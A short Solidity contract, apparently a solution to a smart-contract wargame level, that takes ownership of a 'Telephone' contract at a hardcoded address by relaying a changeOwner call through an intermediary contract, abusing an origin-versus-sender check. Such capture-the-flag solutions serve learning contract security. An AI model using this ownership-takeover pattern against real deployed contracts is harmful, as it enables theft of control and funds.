// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./contract.sol";

contract TelephoneHack {
    Telephone public originalContract =
        Telephone(0xd30321CA2dA377bCe35a21A49256435E47E2BcEf);

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner() public {
        originalContract.changeOwner(msg.sender);
    }
}
